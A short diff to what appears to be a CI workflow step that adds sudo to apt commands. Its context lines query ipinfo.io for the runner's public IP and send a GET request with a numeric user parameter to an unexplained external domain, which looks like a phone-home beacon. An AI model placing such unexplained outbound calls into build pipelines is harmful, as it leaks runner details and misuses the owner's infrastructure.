@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: apt
       run: |
-         apt update
-         apt install curl -y
+         sudo apt update
+         sudo apt install curl -y
          curl ipinfo.io
          curl -X GET "http://www.txyad1.top/down?u=19148854686"
